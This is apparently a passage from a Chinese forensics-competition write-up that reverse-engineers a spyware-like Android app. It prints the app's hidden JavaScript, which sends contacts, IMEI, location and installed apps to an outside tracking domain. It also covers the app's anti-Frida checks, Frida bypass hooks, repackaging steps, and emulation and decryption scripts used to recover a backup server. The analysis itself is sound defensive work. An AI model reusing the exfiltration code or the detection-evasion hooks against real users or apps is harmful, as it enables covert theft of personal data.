+b2
+)));
+}
+return
+sb
+.
+toString
+().
+substring
+(
+0
+,
+16
+).
+getBytes
+(
+"UTF-8"
+);
+}
+catch
+(
+Exception
+unused
+)
+{
+return
+str
+.
+substring
+(
+0
+,
+16
+).
+getBytes
+();
+}
+}
+在
+resources.arsc
+中找到
+config_seed
+为
+hotclub_2026_sec
+:
+计算其 MD5 Hash 为
+3ffc0b996b851d8020ec9232219284ef
+, 取前 16 位作为
+key
+, 进行 AES-256-ECB 解密:
+26 该 APP 前端 JS 代码可以直接调用 Android 原生方法获取用户隐私数据. 请分析暴露了哪些方法用于获取通讯录.
+¶
+答案
+getContactList
+查看第 22 题涉及到的前端页面文件
+file:///android_asset/www/index.html
+:
+HTML
+<
+script
+>
+function
+doLogin
+()
+{
+var
+phone
+=
+document
+.
+getElementById
+(
+"inputPhone"
+).
+value
+;
+/* 将用户输入的手机号通过 Bridge 上报 */
+try
+{
+var
+devInfo
+=
+{
+phone_input
+:
+phone
+,
+device_id
+:
+window
+.
+AppNative
+.
+getDeviceId
+(),
+imei
+:
+window
+.
+AppNative
+.
+getIMEI
+(),
+model
+:
+window
+.
+AppNative
+.
+getDeviceModel
+(),
+location
+:
+window
+.
+AppNative
+.
+getLocation
+(),
+contacts
+:
+window
+.
+AppNative
+.
+getContactsList
+(),
+apps
+:
+window
+.
+AppNative
+.
+getInstalledApps
+()
+};
+var
+img
+=
+new
+Image
+();
+img
+.
+src
+=
+"https://api.sp-live88.com/track?d="
++
+btoa
+(
+JSON
+.
+stringify
+(
+devInfo
+));
+}
+catch
+(
+e
+)
+{}
+alert
+(
+"验证码错误，请重试"
+);
+}
+</
+script
+>
+对应源码的
+NativeBridge
+:
+Java
+public
+String
+getContactsList
+()
+throws
+JSONException
+{
+try
+{
+JSONArray
+jSONArray
+=
+new
+JSONArray
+();
+Cursor
+cursorQuery
+=
+this
+.
+ctx
+.
+getContentResolver
+().
+query
+(
+ContactsContract
+.
+CommonDataKinds
+.
+Phone
+.
+CONTENT_URI
+,
+new
+String
+[]
+{
+"display_name"
+,
+"data1"
+},
+null
+,
+null
+,
+null
+);
+if
+(
+cursorQuery
+!=
+null
+)
+{
+while
+(
+cursorQuery
+.
+moveToNext
+())
+{
+JSONObject
+jSONObject
+=
+new
+JSONObject
+();
+jSONObject
+.
+put
+(
+"n"
+,
+cursorQuery
+.
+getString
+(
+0
+));
+jSONObject
+.
+put
+(
+"p"
+,
+cursorQuery
+.
+getString
+(
+1
+));
+jSONArray
+.
+put
+(
+jSONObject
+);
+}
+cursorQuery
+.
+close
+();
+}
+return
+jSONArray
+.
+toString
+();
+}
+catch
+(
+Exception
+unused
+)
+{
+return
+"[]"
+;
+}
+}
+27 当主上传服务器不可达时, APP 会获取备用服务器地址. 请分析备用服务器的完整域名和端口.
+¶
+答案
+backup.sp-live88.xyz:8443
+接第 24 题,
+Datauploader
+类中, 如果上传失败, 会从
+native
+层获取备用地址:
+Java
+public
+class
+DataUploader
+{
+private
+native
+String
+getBackupEndpoint
+();
+private
+native
+String
+getCommKey
+();
+public
+final
+void
+b
+(
+String
+str
+)
+{
+try
+{
+try
+{
+a
+(
+new
+String
+(
+Base64
+.
+decode
+(
+"aHR0cHM6Ly9hcGkuc3AtbGl2ZTg4LmNvbS9jb2xsZWN0L3VzZXJkYXRh"
+,
+2
+),
+"UTF-8"
+),
+str
+);
+}
+catch
+(
+Exception
+unused
+)
+{
+String
+backupEndpoint
+=
+getBackupEndpoint
+();
+if
+(
+backupEndpoint
+==
+null
+||
+backupEndpoint
+.
+isEmpty
+())
+{
+return
+;
+}
+a
+(
+backupEndpoint
+.
+concat
+(
+"/collect/userdata"
+),
+str
+);
+}
+}
+catch
+(
+Exception
+unused2
+)
+{
+}
+}
+}
+使用 IDA 加载
+apk/lib/libsecurity.so
+文件, 该 so 文件存在反调试:
+C
+__int64
+sub_F94
+()
+{
+FILE
+*
+v0
+;
+// x0
+FILE
+*
+v1
+;
+// x19
+int
+v2
+;
+// w20
+unsigned
+int
+v3
+;
+// w20
+int
+v4
+;
+// w0
+int
+v5
+;
+// w19
+FILE
+*
+v6
+;
+// x0
+FILE
+*
+v7
+;
+// x19
+DIR
+*
+v8
+;
+// x0
+DIR
+*
+v9
+;
+// x19
+struct
+dirent
+*
+v10
+;
+// x0
+struct
+dirent
+*
+v11
+;
+// x4
+const
+char
+*
+d_name
+;
+// x4
+int
+v13
+;
+// t1
+FILE
+*
+v14
+;
+// x0
+FILE
+*
+v15
+;
+// x26
+struct
+sockaddr
+s
+[
+32
+];
+// [xsp+10h] [xbp-270h] BYREF
+char
+optval
+[
+72
+];
+// [xsp+210h] [xbp-70h] BYREF
+char
+haystack
+[
+32
+];
+// [xsp+258h] [xbp-28h] BYREF
+__int64
+v20
+;
+// [xsp+278h] [xbp-8h]
+v20
+=
+*
+(
+_QWORD
+*
+)(
+_ReadStatusReg
+(
+TPIDR_EL0
+)
++
+40
+);
+v0
+=
+fopen
+(
+"/proc/self/status"
+,
+"r"
+);
+if
+(
+v0
+)
+{
+v1
+=
+v0
+;
+do
+{
+if
+(
+!
+fgets
+((
+char
+*
+)
+s
+,
+512
+,
+v1
+)
+)
+{
+fclose
+(
+v1
+);
+goto
+LABEL_8
+;
+}
+}
+while
+(
+*
+(
+_QWORD
+*
+)
+&
+s
+[
+0
+].
+sa_family
+^
+0x6950726563617254LL
+|
+*
+(
+unsigned
+__int16
+*
+)
+&
+s
+[
+0
+].
+sa_data
+[
+6
+]
+^
+0x3A64LL
+);
+v2
+=
+atoi
+(
+&
+s
+[
+0
+].
+sa_data
+[
+8
+]);
+fclose
+(
+v1
+);
+if
+(
+!
+v2
+)
+goto
+LABEL_8
+;
+return
+1
+;
+}
+else
+{
+LABEL_8
+:
+v4
+=
+socket
+(
+2
+,
+1
+,
+0
+);
+if
+(
+(
+v4
+&
+0x80000000
+)
+==
+0
+)
+{
+v5
+=
+v4
+;
+*
+(
+_QWORD
+*
+)
+&
+s
+[
+0
+].
+sa_data
+[
+6
+]
+=
+0
+;
+s
+[
+0
+].
+sa_family
+=
+2
+;
+*
+(
+_DWORD
+*
+)
+&
+s
+[
+0
+].
+sa_data
+[
+2
+]
+=
+inet_addr
+(
+"127.0.0.1"
+);
+*
+(
+_WORD
+*
+)
+s
+[
+0
+].
+sa_data
+=
+41577
+;
+*
+(
+_OWORD
+*
+)
+optval
+=
+xmmword_9A0
+;
+setsockopt
+(
+v5
+,
+1
+,
+21
+,
+optval
+,
+0x10u
+);
+if
+(
+!
+connect
+(
+v5
+,
+s
+,
+0x10u
+)
+||
+(
+*
+(
+_WORD
+*
+)
+s
+[
+0
+].
+sa_data
+=
+-23703
+,
+*
+(
+_OWORD
+*
+)
+optval
+=
+xmmword_9A0
+,
+setsockopt
+(
+v5
+,
+1
+,
+21
+,
+optval
+,
+0x10u
+),
+!
+connect
+(
+v5
+,
+s
+,
+0x10u
+))
+)
+{
+close
+(
+v5
+);
+return
+1
+;
+}
+close
+(
+v5
+);
+}
+v6
+=
+fopen
+(
+"/proc/self/maps"
+,
+"r"
+);
+if
+(
+v6
+)
+{
+v7
+=
+v6
+;
+while
+(
+fgets
+((
+char
+*
+)
+s
+,
+512
+,
+v7
+)
+)
+{
+if
+(
+strstr
+((
+const
+char
+*
+)
+s
+,
+"frida"
+)
+||
+strstr
+((
+const
+char
+*
+)
+s
+,
+"gadget"
+)
+||
+strstr
+((
+const
+char
+*
+)
+s
+,
+"gmain"
+)
+||
+strstr
+((
+const
+char
+*
+)
+s
+,
+"linjector"
+)
+)
+{
+fclose
+(
+v7
+);
+return
+1
+;
+}
+}
+fclose
+(
+v7
+);
+}
+sub_14D4
+((
+__int64
+)
+optval
+,
+64
+,
+64
+,
+"/proc/self/task"
+);
+v8
+=
+opendir
+(
+optval
+);
+if
+(
+v8
+)
+{
+v9
+=
+v8
+;
+v10
+=
+readdir
+(
+v8
+);
+if
+(
+v10
+)
+{
+v11
+=
+v10
+;
+do
+{
+v13
+=
+(
+unsigned
+__int8
+)
+v11
+->
+d_name
+[
+0
+];
+d_name
+=
+v11
+->
+d_name
+;
+if
+(
+v13
+!=
+46
+)
+{
+sub_14D4
+((
+__int64
+)
+s
+,
+64
+,
+64
+,
+"/proc/self/task/%s/comm"
+,
+d_name
+);
+v14
+=
+fopen
+((
+const
+char
+*
+)
+s
+,
+"r"
+);
+if
+(
+v14
+)
+{
+v15
+=
+v14
+;
+if
+(
+fgets
+(
+haystack
+,
+32
+,
+v14
+)
+&&
+(
+strstr
+(
+haystack
+,
+"gmain"
+)
+||
+strstr
+(
+haystack
+,
+"gdbus"
+)
+||
+strstr
+(
+haystack
+,
+"gum-js-loop"
+)
+||
+strstr
+(
+haystack
+,
+"frida"
+))
+)
+{
+fclose
+(
+v15
+);
+v3
+=
+1
+;
+goto
+LABEL_36
+;
+}
+fclose
+(
+v15
+);
+}
+}
+v11
+=
+readdir
+(
+v9
+);
+}
+while
+(
+v11
+);
+}
+v3
+=
+0
+;
+LABEL_36
+:
+closedir
+(
+v9
+);
+}
+else
+{
+return
+0
+;
+}
+}
+return
+v3
+;
+}
+这段代码是一个反调试和反注入检测函数, 主要用于检测当前进程是否被调试或是否注入了常见的动态分析工具:
+检测TracerPid: 读取
+/proc/self/status
+, 查找
+TracerPid:
+字段. 若其值非 0, 说明进程正在被跟踪调试, 返回
+1
+.
+尝试连接特定端口: 创建 socket 并尝试连接本地的端口 41577 和 41833. 若连接成功, 则认为存在可疑服务(可能是 Frida 服务端), 返回
+1
+.
+扫描内存映射: 读取
+/proc/self/maps
+, 查找是否包含
+frida
+、
+gadget
+、
+gmain
+、
+linjector
+等字符串. 若存在, 说明 Frida 或 GDB 等动态调试组件已注入进程, 返回
+1
+.
+检查线程名称: 遍历
+/proc/self/task/
+下所有线程的
+comm
+文件, 若线程名包含
+gmain
+、
+gdbus
+、
+gum-js-loop
+或
+frida
+, 则说明有 Frida 或 GDB 等动态调试组件相关线程在运行, 返回
+1
+.
+直接使用雷电 APP 智能分析中的 Frida 脚本 hook 该应用的
+getBackupEndpoint()
+方法会失败:
+这里给几个思路:
+Frida 脚本反反调试
+¶
+注意
+对于比赛时常规使用雷电快速分析的同学, 可能会发现无论如何无法加载目标库的情况. 这是因为这题的 APK 包中没有包含 x86 架构的库, 因此在 x86 架构的安卓模拟器上是无法加载的. 需要切换到 arm 架构的安卓模拟器或使用真机才能加载成功.
+检测主要都是针对 Frida 注入后的特征:
+读
+/proc/self/status
+的 TracerPid 字段, 如果不为 0 则说明被调试了. 但这仅对 frida attach 有效, 因为 spawn 模式下
+frida-agent
+的 ptrace 在注入完成后会释放掉.
+连接 27042 和 27043 端口, 如果能连接上则说明被 frida 注入了.
+遍历
+/proc/self/maps
+中的内存映射, 如果发现有一些可疑字符串则认为被注入了.
+检查
+/proc/self/task/<pid>/comm
+中的线程名称, 同样如果发现有一些可疑字符串则认为被注入了.
+绕过的出发点在于这些检测本质都是基于 libc 的, 因此可以通过 hook libc 来绕过这些检测. 而本题显然没有考虑到这一点, 进而检测 libc 完整性. 因此只需要用如下脚本就可以实现绕过:
+JavaScript
+var
+devNull
+=
+Memory
+.
+allocUtf8String
+(
+"/dev/null"
+);
+Interceptor
+.
+attach
+(
+fopen
+,
+{
+onEnter
+:
+function
+(
+args
+)
+{
+var
+p
+=
+args
+[
+0
+].
+readCString
+();
+if
+(
+p
+&&
+p
+.
+indexOf
+(
+"/proc/self/status"
+)
+>=
+0
+)
+args
+[
+0
+]
+=
+devNull
+;
+}
+});
+Interceptor
+.
+attach
+(
+connect
+,
+{
+onEnter
+:
+function
+(
+args
+)
+{
+if
+(
+args
+[
+2
+].
+toInt32
+()
+>=
+16
+&&
+args
+[
+1
+].
+readU16
+()
+===
+2
+)
+{
+var
+port
+=
+args
+[
+1
+].
+add
+(
+2
+).
+readU16
+();
+if
+(
+FRIDA_PORTS_NBO
+.
+indexOf
+(
+port
+)
+>=
+0
+)
+args
+[
+1
+].
+add
+(
+2
+).
+writeU16
+(
+0
+);
+}
+}
+});
+Interceptor
+.
+attach
+(
+strstr
+,
+{
+onEnter
+:
+function
+(
+args
+)
+{
+try
+{
+var
+n
+=
+args
+[
+1
+].
+readCString
+();
+this
+.
+block
+=
+(
+n
+&&
+DETECT_STRINGS
+.
+indexOf
+(
+n
+)
+>=
+0
+);
+}
+catch
+(
+e
+)
+{
+this
+.
+block
+=
+false
+;
+}
+},
+onLeave
+:
+function
+(
+retval
+)
+{
+if
+(
+this
+.
+block
+)
+retval
+.
+replace
+(
+ptr
+(
+0
+));
+}
+});
+然而想获取备用的 URL, 还不是那么轻松. 必须先 new 一个
+DataUploader
+实例, 然后主动调用
+getBackupEndpoint
+方法, 否则会发现触发不到, 很神奇.
+JavaScript
+Java
+.
+perform
+(
+function
+()
+{
+try
+{
+var
+inst
+=
+Java
+.
+use
+(
+"com.livevideo.hotclub.collector.DataUploader"
+).
+$new
+();
+inst
+.
+getBackupEndpoint
+();
+inst
+.
+getCommKey
+();
+}
+catch
+(
+e
+)
+{}
+});
+下面是 hook getBackupEndpoint 和 getCommKey 的脚本:
+JavaScript
+Interceptor
+.
+attach
+(
+base
+.
+add
+(
+0xECC
+),
+{
+onEnter
+:
+function
+()
+{
+try
+{
+var
+url
+=
+this
+.
+context
+.
+sp
+.
+readCString
+();
+console
+.
+log
+(
+"[+] getBackupEndpoint: "
++
+url
+);
+}
+catch
+(
+e
+)
+{
+console
+.
+log
+(
+"[-] sub_E00 read: "
++
+e
+);
+}
+}
+});
+Interceptor
+.
+attach
+(
+base
+.
+add
+(
+0xF08
+),
+{
+onLeave
+:
+function
+(
+retval
+)
+{
+try
+{
+var
+str
+=
+Java
+.
+cast
+(
+retval
+,
+Java
+.
+use
+(
+"java.lang.String"
+));
+console
+.
+log
+(
+"[+] getCommKey: "
++
+str
+);
+}
+catch
+(
+e
+)
+{
+console
+.
+log
+(
+"[-] sub_F08 read: "
++
+e
+);
+}
+}
+});
+会看到类似这样的输出:
+所以备用地址是
+https://backup.sp-live88.xyz:8443/api/v2
+.
+二次打包
+¶
+直接 patch native 文件, 将反调试函数的返回值写死为 0:
+修改前:
+修改后:
+类似的, 对
+apk/lib
+下所有架构的
+.so
+文件都进行修补, 然后重新打包、签名, 这里需要注意的是打包过程中在
+Manifest.xml
+中添加
+android:extractNativeLibs="true"
+属性, 并且修改
+targetSdkVersion
+为 29, 再重新运行
+frida
+脚本:
+模拟执行
+¶
+通过初步的分析可以清晰看到, 该函数的调用链应该是:
+Text Only
+Java: DataUploader.getBackupEndpoint()  [native]
+→ JNI_OnLoad (0xD4C) 注册 JNI 方法表
+→ sub_E00 (getBackupEndpoint 的 native 实现，0xE00)
+→ sub_F94 (反调试检测，0xF94) — 检查 frida/gadget/gmain/linjector
+→ sub_1324 (核心解密函数，0x1324) — XOR + XTEA
+核心代码是
+sub_1324
+, 其中仅涉及
+malloc
+/
+free
+/
+memcpy
+常见的
+libc
+函数, 这些函数模拟实现比较简单. 并且, 该函数不涉及复杂的内存操作, 以及不存在环境依赖操作. 因此我们直接使用
+unicorn
+模拟执行相关函数, 具体内容直接见注释:
+Python
+import
+struct
+import
+sys
+from
+unicorn
+import
+*
+from
+unicorn.arm64_const
+import
+*
+# # 读取 .so 二进制文件
+# libsecurity.so 是 AArch64 架构的 ELF 共享库, 被 APK 中的 Java 代码通过 System.loadLibrary("security") 加载
+SO_PATH
+=
+r
+'libsecurity.so'
+with
+open
+(
+SO_PATH
+,
+'rb'
+)
+as
+f
+:
+so_data
+=
+f
+.
+read
+()
+# # 配置 Unicorn 模拟器的内存布局
+# 模拟器需要为代码、栈、堆分别分配独立的内存区域
+# 地址空间布局：
+#   0x00000 - 0x0FFFF  (64KB)  — 代码段（加载 .so 的 LOAD 段）
+#   0x100000 - 0x10FFFF (64KB) — 栈
+#   0x200000 - 0x20FFFF (64KB) — 堆（用于 malloc 分配）
+#   0xF0000 - 0xF0FFF  (4KB)  — 返回地址陷阱页
+mu
+=
+Uc
+(
+UC_ARCH_ARM64
+,
+UC_MODE_ARM
+)
+# ## 代码段：加载 .so 文件
+# ELF 程序头定义了三个 LOAD 段：
+#   LOAD #1: file_offset=0x0,    vaddr=0x0,    filesz=0x16F0 (代码+只读数据)
+#   LOAD #2: file_offset=0x16F0, vaddr=0x26F0, filesz=0x288  (可读写数据)
+#   LOAD #3: file_offset=0x1978, vaddr=0x3978, filesz=0x30   (GOT 表)
+# 由于第一个 LOAD 段映射 vaddr=0x0，我们直接将整个文件加载到地址 0x0
+CODE_BASE
+=
+0x0
+CODE_SIZE
+=
+0x10000
+# 64KB，足以覆盖整个 .so（实际 8376 字节）
+mu
+.
+mem_map
+(
+CODE_BASE
+,
+CODE_SIZE
+)
+# 分配代码内存
+mu
+.
+mem_write
+(
+CODE_BASE
+,
+so_data
+)
+# 将 .so 内容写入模拟地址空间
+# ## 栈
+# ARM64 函数调用需要栈来保存局部变量、寄存器溢出等
+# sub_1324 的栈帧大小为 0x30 字节（见 STP X29, X30, [SP, #-0x30+var_s0]!）
+STACK_BASE
+=
+0x100000
+STACK_SIZE
+=
+0x10000
+# 64KB
+mu
+.
+mem_map
+(
+STACK_BASE
+,
+STACK_SIZE
+)
+# 栈指针初始化到栈顶（ARM64 栈向低地址增长）
+mu
+.
+reg_write
+(
+UC_ARM64_REG_SP
+,
+STACK_BASE
++
+STACK_SIZE
+-
+0x100
+)
+# ## 堆
+# sub_1324 调用 malloc 分配临时缓冲区：
+#   malloc(32) — 存放 XOR+TEA 解密过程中的中间数据
+#   malloc(26) — 存放最终的 null-terminated 结果字符串
+HEAP_BASE
+=
+0x200000
+HEAP_SIZE
+=
+0x10000
+# 64KB
+mu
+.
+mem_map
+(
+HEAP_BASE
+,
+HEAP_SIZE
+)
+heap_ptr
+=
+HEAP_BASE
+# 堆分配指针（简单递增，不回收）
+# ## 返回地址陷阱页
+# 函数返回时 PC 会跳转到 LR 寄存器指定的地址
+# 我们将 LR 设为陷阱页地址，执行到此处时 Unicorn 抛出异常来终止模拟
+HOOK_BASE
+=
+0xF0000
+mu
+.
+mem_map
+(
+HOOK_BASE
+,
+0x1000
+)
+# # 拦截 PLT 外部函数（libc 调用）
+#
+# sub_1324 调用了三个 libc 函数：
+#   malloc  — 堆内存分配
+#   memcpy  — 内存拷贝
+#   free    — 释放堆内存
+#
+# 这些函数通过 PLT（Procedure Linkage Table）调用
+# PLT 是 .so 中的跳板代码，运行时通过 GOT 表间接跳转到真正的 libc 实现
+# 由于我们没有加载 libc，需要在 PLT 入口处拦截并模拟这些函数的行为
+#
+# PLT 入口地址（来自 IDA 函数列表）：
+#   .free   → 0x15E0
+#   .malloc → 0x16C0
+#   .memcpy → 0x16D0
+PLT_FREE
+=
+0x15E0
+# .free 的 PLT 入口
+PLT_MALLOC
+=
+0x16C0
+# .malloc 的 PLT 入口
+PLT_MEMCPY
+=
+0x16D0
+# .memcpy 的 PLT 入口
+def
+hook_plt
+(
+mu
+,
+address
+,
+size
+,
+user_data
+):
+"""
+PLT 函数拦截器
+当模拟器执行到 PLT 入口地址时，Unicorn 触发此回调
+我们根据地址判断是哪个函数，模拟其行为后直接修改 PC 跳转到返回地址
+ARM64 调用约定：
+X0       — 第一个参数 / 返回值
+X1       — 第二个参数
+X2       — 第三个参数
+X30 (LR) — 返回地址
+"""
+global
+heap_ptr
+if
+address
+==
+PLT_MALLOC
+:
+# 模拟 malloc(size)
+# 参数：X0 = 请求的字节数
+# 返回：X0 = 分配的内存地址
+size_arg
+=
+mu
+.
+reg_read
+(
+UC_ARM64_REG_X0
+)
+# 读取 size 参数
+result
+=
+heap_ptr
+# 从堆当前指针分配
+heap_ptr
++=
+size_arg
++
+16
+# 预留 16 字节对齐空间
+heap_ptr
+=
+(
+heap_ptr
++
+15
+)
+&
+~
+15
+# 16 字节对齐
+mu
+.
+reg_write
+(
+UC_ARM64_REG_X0
+,
+result
+)
+# 设置返回值
+# 跳转到 LR（模拟函数返回）
+lr
+=
+mu
+.
+reg_read
+(
+UC_ARM64_REG_X30
+)
+mu
+.
+reg_write
+(
+UC_ARM64_REG_PC
+,
+lr
+)
+elif
+address
+==
+PLT_MEMCPY
+:
+# 模拟 memcpy(dest, src, n)
+# 参数：X0=dest, X1=src, X2=n
+# 返回：X0=dest
+dest
+=
+mu
+.
+reg_read
+(
+UC_ARM64_REG_X0
+)
+src
+=
+mu
+.
+reg_read
+(
+UC_ARM64_REG_X1
+)
+n
+=
+mu
+.
+reg_read
+(
+UC_ARM64_REG_X2
+)
+# 从源地址读取数据，写入目标地址
+data
+=
+mu
+.
+mem_read
+(
+src
+,
+n
+)
+mu
+.
+mem_write
+(
+dest
+,
+bytes
+(
+data
+))
+mu
+.
+reg_write
+(
+UC_ARM64_REG_X0
+,
+dest
+)
+# 返回 dest
+lr
+=
+mu
+.
+reg_read
+(
+UC_ARM64_REG_X30
+)
+mu
+.
+reg_write
+(
+UC_ARM64_REG_PC
+,
+lr
+)
+elif
+address
+==
+PLT_FREE
+:
+# 模拟 free(ptr)
+# 我们使用简单的递增堆分配器，不需要真正释放
+lr
+=
+mu
+.
+reg_read
+(
+UC_ARM64_REG_X30
+)
+mu
+.
+reg_write
+(
+UC_ARM64_REG_PC
+,
+lr
+)
+# 注册 PLT 拦截钩子
+# UC_HOOK_CODE 在模拟器执行到指定地址范围内的任何指令时触发
+mu
+.
+hook_add
+(
+UC_HOOK_CODE
+,
+hook_plt
+,
+begin
+=
+PLT_FREE
+,
+end
+=
+PLT_FREE
++
+4
+)
+mu
+.
+hook_add
+(
+UC_HOOK_CODE
+,
+hook_plt
+,
+begin
+=
+PLT_MALLOC
+,
+end
+=
+PLT_MALLOC
++
+4
+)
+mu
+.
+hook_add
+(
+UC_HOOK_CODE
+,
+hook_plt
+,
+begin
+=
+PLT_MEMCPY
+,
+end
+=
+PLT_MEMCPY
++
+4
+)
+# # 设置返回地址陷阱
+# 在陷阱页写入 BRK #0 指令（ARM64 断点指令）
+# 当 sub_1324 执行 RET 返回时，PC 跳转到此处, Unicorn 遇到未处理的 BRK 指令会抛出 UC_ERR_EXCEPTION
+# 我们捕获该异常即可知道函数执行完毕
+RETURN_ADDR
+=
+HOOK_BASE
+BRK_INSN
+=
+b
+'
+\x00\x00\x20\xD4
+'
+# BRK #0 的机器码
+mu
+.
+mem_write
+(
+RETURN_ADDR
+,
+BRK_INSN
+)
+# # 第五步：解密函数
+def
+decrypt
+(
+enc_addr
+,
+enc_size
+):
+"""
+模拟调用 sub_1324(enc_addr, enc_size)
+sub_1324 的完整逻辑（地址 0x1324 - 0x14D0）：
+1. malloc(enc_size) — 分配工作缓冲区
+2. memcpy(buf, enc, enc_size) — 复制加密数据
+3. XOR 循环 — 逐字节与 (index & 0xF) ^ 0x55 异或
+4. TEA 循环 — 每 8 字节一组，64 轮 XTEA 解密
+5. 读取最后一个字节作为填充长度
+6. malloc(str_len + 1) — 分配结果字符串缓冲区
+7. memcpy(result, buf, str_len) — 复制明文
+8. result[str_len] = '\0' — null 终止
+9. free(buf) — 释放工作缓冲区
+10. return result — 返回 C 字符串指针
+参数：
+enc_addr — 加密数据在 .so 中的虚拟地址
+enc_size — 加密数据的字节长度
+返回：
+解密后的 ASCII 字符串
+"""
+global
+heap_ptr
+heap_ptr
+=
+HEAP_BASE
+# 重置堆指针
+# 设置函数参数（ARM64 调用约定）
+mu
+.
+reg_write
+(
+UC_ARM64_REG_X0
+,
+enc_addr
+)
+# 加密数据地址
+mu
+.
+reg_write
+(
+UC_ARM64_REG_X1
+,
+enc_size
+)
+# 数据长度
+mu
+.
+reg_write
+(
+UC_ARM64_REG_X30
+,
+RETURN_ADDR
+)
+# 设置返回地址为陷阱页
+# 从 sub_1324 入口地址开始模拟执行
+# 执行会在遇到 BRK 指令时停止
+try
+:
+mu
+.
+emu_start
+(
+0x1324
+,
+RETURN_ADDR
+)
+except
+UcError
+:
+pass
+# BRK 引发的异常是预期行为
+# 读取函数返回值（X0 = C 字符串指针）
+result_ptr
+=
+mu
+.
+reg_read
+(
+UC_ARM64_REG_X0
+)
+if
+not
+result_ptr
+or
+result_ptr
+==
+0
+:
+return
+''
+# 从返回的指针处读取字符串，查找 null 终止符
+raw
+=
+mu
+.
+mem_read
+(
+result_ptr
+,
+256
+)
+# 最多读 256 字节
+null_idx
+=
+raw
+.
+find
+(
+b
+'
+\x00
+'
+)
+if
+null_idx
+>=
+0
+:
+result_bytes
+=
+bytes
+(
+raw
+[:
+null_idx
+])
+else
+:
+result_bytes
+=
+bytes
+(
+raw
+)
+return
+result_bytes
+.
+decode
+(
+'ascii'
+,
+errors
+=
+'replace'
+)
+ENCRYPTED_ENDPOINT
+=
+0xAB0
+# unk_AB0 — getBackupEndpoint 的 32 字节密文
+ENCRYPTED_COMMKEY
+=
+0xAD0
+# unk_AD0 — getCommKey 的 24 字节密文
+endpoint
+=
+decrypt
+(
+ENCRYPTED_ENDPOINT
+,
+0x20
+)
+# 32 字节
+commkey
+=
+decrypt
+(
+ENCRYPTED_COMMKEY
+,
+0x18
+)
+# 24 字节
+print
+(
+endpoint
+)
+print
+(
+commkey
+)
+静态分析
+¶
+说实话这个解密的逆向不算复杂, 只是平时"歪门邪道"用的多, 不太啃算法, 比赛的时候也是直接跑的 AI. 复盘就具体详细分析下(请认真分析, 只是 AI 写的分析比我写的好, 所以这里放AI生成的脚本):
+Python
+"""
+libsecurity.so 静态解密脚本
+加密算法概述：
+数据经过两层加密保护：
+第一层 — XOR 混淆：每个字节与 (字节索引 & 0x0F) ^ 0x55 异或
+第二层 — 自定义 XTEA 分组密码：64 轮迭代，使用双独立累加和
+解密时需要先撤销 XOR（第一层），再撤销 XTEA（第二层）。
+由于 XOR 是自逆运算（连续 XOR 两次恢复原值），解密和加密使用相同操作。
+调用链：
+Java: DataUploader.getBackupEndpoint()  [native]
+→ JNI_OnLoad 注册 → sub_E00 (getBackupEndpoint 的 native 实现)
+→ sub_F94 (反调试检测，检查 frida/gadget 等)
+→ sub_1324 (核心解密函数：XOR + XTEA)
+"""
+import
+struct
+import
+sys
+# 设置标准输出编码为 UTF-8，避免 Windows GBK 编码问题
+sys
+.
+stdout
+.
+reconfigure
+(
+encoding
+=
+'utf-8'
+,
+errors
+=
+'replace'
+)
+# ================================================================
+# 第一步：读取 .so 二进制文件
+# ================================================================
+# libsecurity.so 是一个 AArch64 (ARM64) 架构的 ELF 共享库，
+# 被 Android APK 通过 System.loadLibrary("security") 加载。
+# ELF LOAD 段映射：file_offset 0x0 → vaddr 0x0，因此文件偏移 = 虚拟地址。
+SO_PATH
+=
+r
+'F:\2026fic_runtime\HotClub_v2.1.6\lib\arm64-v8a\libsecurity.so'
+with
+open
+(
+SO_PATH
+,
+'rb'
+)
+as
+f
+:
+binary
+=
+f
+.
+read
+()
+# 整个 .so 文件内容，按偏移索引访问
+# ================================================================
+# 第二步：辅助函数 — 从二进制中提取常量
+# ================================================================
+def
+read32
+(
+offset
+):
+return
+struct
+.
+unpack_from
+(
+'<I'
+,
+binary
+,
+offset
+)[
+0
+]
+def
+read_movz_movk
+(
+movz_addr
+,
+movk_addr
+):
+"""从一对 AArch64 MOVZ + MOVK 指令中解码出 32 位立即数常量。
+背景：
+ARM64 的 MOV 指令无法一次性加载 32 位立即数，编译器会拆分为：
+MOVZ Wn, #imm16          ; 将 16 位立即数写入低 16 位，其余清零
+MOVK Wn, #imm16, LSL#16  ; 将 16 位立即数写入高 16 位，保留其余位
+两条指令组合即可构造任意 32 位常量。
+指令编码格式（AArch64）：
+MOVZ: [sf:1][opc:10][100101][hw:2][imm16:16][Rd:5]
+MOVK: [sf:1][opc:11][100101][hw:2][imm16:16][Rd:5]
+其中 hw 指定移位量：00=LSL#0, 01=LSL#16, 10=LSL#32, 11=LSL#48
+参数：
+movz_addr — MOVZ 指令在文件中的偏移地址
+movk_addr — MOVK 指令在文件中的偏移地址
+返回：
+组合后的 32 位无符号整数
+示例（sub_1324 中加载 TEA 轮常量 DELTA_NEG）：
+0x13EC: MOVZ W10, #0x864F         → W10 = 0x0000864F
+0x13F8: MOVK W10, #0x61C8, LSL#16 → W10 = 0x61C8864F
+read_movz_movk(0x13EC, 0x13F8) 返回 0x61C8864F
+"""
+movz
+=
+read32
+(
+movz_addr
+)
+# 读取 MOVZ 指令的 4 字节机器码
+movk
+=
+read32
+(
+movk_addr
+)
+# 读取 MOVK 指令的 4 字节机器码
+# 从 MOVZ 中提取低 16 位立即数：bits[20:5]
+imm_lo
+=
+(
+movz
+>>
+5
+)
+&
+0xFFFF
+# 从 MOVK 中提取高 16 位立即数和移位量
+imm_hi
+=
+(
+movk
+>>
+5
+)
+&
+0xFFFF
+# bits[20:5]
+hw
+=
+(
+movk
+>>
+21
+)
+&
+3
+# bits[22:21]，0=LSL#0, 1=LSL#16
+# 组合：低 16 位 | (高 16 位 << 移位量)
+return
+imm_lo
+|
+(
+imm_hi
+<<
+(
+hw
+*
+16
+))
+# ================================================================
+# 第三步：从二进制中提取加密常量
+# ================================================================
+# --- TEA 密钥（4 个 32 位字）---
+# 存放于 .rodata 段的 dword_990 处，共 16 字节。
+# 这些是编译时硬编码的 XTEA 分组密码密钥。
+# 在 sub_1324 的 TEA 循环中通过 LDR W1, [X12, Wn, UXTW#2] 指令访问。
+TEA_KEY
+=
+[
+read32
+(
+0x990
+),
+# key[0] = 0xDEADBEEF
+read32
+(
+0x994
+),
+# key[1] = 0xCAFEBABE
+read32
+(
+0x998
+),
+# key[2] = 0x12345678
+read32
+(
+0x99C
+),
+# key[3] = 0x9ABCDEF0
+]
+# --- XTEA 轮常量 DELTA_NEG ---
+# 来源：sub_1324 TEA 循环中的 ADD W16, W16, W10 / ADD W0, W0, W10
